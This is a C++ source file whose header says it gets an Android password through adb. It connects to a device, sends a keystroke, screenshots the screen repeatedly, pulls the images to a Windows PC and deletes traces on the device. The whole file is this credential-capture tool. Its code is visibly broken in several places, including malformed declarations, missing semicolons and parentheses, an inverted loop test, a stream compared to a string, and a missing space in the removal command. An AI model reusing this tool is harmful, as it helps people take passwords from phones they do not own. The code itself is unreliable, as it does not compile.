/*
Get android password through adb
Not tested
os: windows
 */
#include <iostream>
#include <fstream>
#include <string>
#include <filesystem>
#include <windows.h>
using std::cin;
using std::cout;
using std::ifstream;
using std::ios;
using std::ofstream;
using std::string;
using std::filesystem::path;
using std::filesystem::bool remove(const std::filesystem::path &);
const char ch[16] = {"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F"};
constexpr unsigned int s = sizeof(unsigned int) / sizeof(char);
unsigned int wait = 0, time = 1;
string ip, port = "", command[2], p[2];
bool com;
union to_int {
	char ch[s];
	unsigned int in;
} string to_string(unsigned int a)
{
	constexpr unsigned int l = sizeof(unsigned int) * 2;
	constexpr unsigned int size = sizeof(unsigned int);
	unsigned int temp = 0x0f, c;
	char *res = new char[l];
	for (unsigned int i = 0; i < l; i++)
	{
		c = (a & temp) >> (4 * i)
							  res[i] = ch[c];
		temp = temp << 4;
	}
	return string(res);
}
inline void cmd(const char *a)
{
	cout << a << endl
		 << endl;
	system(a);
}
bool compare(string fileA, string fileB)
{
	ifstream a, b;
	to_int iA, iB;
	unsigned int ta, tb;
	a.open(fileA, ios::in | ios::binary);
	b.open(fileB, ios::in | ios::binary);
	if ((!a.is_open()) | (!b.is_open()))
	{
		throw 0;
	}
	while (a.eof())
	{
		a.read(iA.ch, s);
		b.read(iB.ch, s);
		if (iA.in != iB.in)
		{
			a.close();
			b.close();
			return false;
		}
	}
	a.close();
	b.close();
	return true;
}
int main()
{
	//read from file
	{
		string name;
		cout << "Enter the file name" << endl;
		cin >> name;
		ifstream a;
		a.open(name, ios::in);
		if (!a.is_open())
		{
			cout << "Can't open file" << endl;
			cout << "Press enter to exit" << endl;
			cin.get();
			return 0;
		}
		string t;
		for (unsigned int i = 0; i < 7; i++)
		{
			a >> t;
			if (t == "ip:")
			{
				a >> ip;
				continue;
			}
			if (t == "port:")
			{
				a >> port;
				continue;
			}
			if (t == "path(device computer):")
			{
				a >> p[0] >> p[1];
				continue;
			}
			if (a == "command:")
			{
				getline(a, command[0]);
				getline(a, command[1]);
				continue;
			}
			if (t == "compare:")
			{
				a.setf(ios::boolalpha);
				a >> com;
				a.unsetf(ios::boolalpha);
				continue;
			}
		}
		a.close();
	}
	string temp;
	//start server
	cmd("adb start-server");
	//connect to the device
	temp = "adb connect " + ip;
	if (port != "")
	{
		temp = temp + " :" + port;
	}
	cmd(temp.c_str());
	cmd("adb wait-for-device");
	//make temp dir on the device
	temp = "adb shell mkdir " + p[0];
	cmd(temp.c_str());
	temp = "adb shell cd " + p[0];
	cmd(temp.c_str());
	//send the keyevent
	cmd(command[0].c_str());
	//record the screen
	for (unsigned int i = 0; i < time; i++)
	{
		temp = command[1] + " " + p[0] + "/" + to_string(i) + ".png";
		cmd(temp.c_str());
		sleep(wait);
	}
	//get the picture from the device
	for (unsigned int i = 0; i < time; i++)
	{
		temp = "adb pull " + p[0] + "/" + to_string(i);
		temp = temp + " " + p[1] + "\\" + to_string(i);
		cmd(temp.c_str());
	}
	//remove the tempdir on the device
	temp = "adb shell rm -r" + p[0];
	cmd(temp.c_str());
	//remove the same picture
	if (!com)
		goto nocompare;
	{
		path before, th;
		unsigned int t0 = 0, t1 = 1;
		auto g = [](unsigned int name, string pa) -> path {string t=pa+"\\"+to_string(name);return path::path(t); };
		before = g(0, p[1]);
		th = g(1, p[1]);
		if(compare(to_string(0u),to_string(1u))
		{
			remove(th);
			th = g(2u, p[1]);
			t1 = 2;
		}
		for(;t1<time;t1++)
		{
			th = g(t1, p[1]);
			if(compare(to_string(t0),to_string(t1))
			{
				remove(th);
			}
			else
			{
				t0++;
				before = g(t0, p[1]);
			}
		}
	}
nocompare:;
	//kill the server
	cmd("adb kill-server");
	//exit
	cout << "Press enter to exit" << endl;
	cin.get();
	return 0;
}
